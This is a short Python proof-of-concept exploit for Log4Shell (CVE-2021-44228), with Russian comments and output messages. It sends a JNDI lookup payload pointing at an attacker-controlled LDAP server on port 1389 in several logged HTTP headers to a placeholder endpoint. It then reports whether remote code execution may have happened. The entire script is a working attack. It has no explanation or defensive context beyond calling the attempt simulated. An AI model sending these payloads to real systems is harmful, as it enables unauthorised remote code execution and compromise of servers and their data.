import requests

# Условный URL уязвимого приложения
url = "http://example.com/api/endpoint"

# JNDI-payload для Log4Shell
payload = "${jndi:ldap://attacker-controlled-server:1389/Exploit}"

# Заголовки, в которые внедряется payload (любые логируемые)
headers = {
    "User-Agent": payload,
    "X-Forwarded-For": payload,
    "Referer": payload,
    "X-Api-Version": payload
}

try:
    response = requests.get(url, headers=headers, timeout=5)
    
    print("[+] Потенциальная эксплуатация CVE-2021-44228 (Log4Shell) имитирована.")
    print("[+] Вредоносный JNDI-payload отправлен в заголовках HTTP-запроса.")
    print(f"[+] Код ответа сервера: {response.status_code}")
    
    if response.status_code == 200:
        print("[+] Сервер успешно обработал запрос. В случае наличия уязвимости могло произойти удалённое выполнение кода.")
    else:
        print("[-] Неожиданный код ответа. Уязвимость может быть частично устранена или отсутствовать.")
        
except Exception as e:
    print(f"[-] Ошибка при отправке запроса: {str(e)}")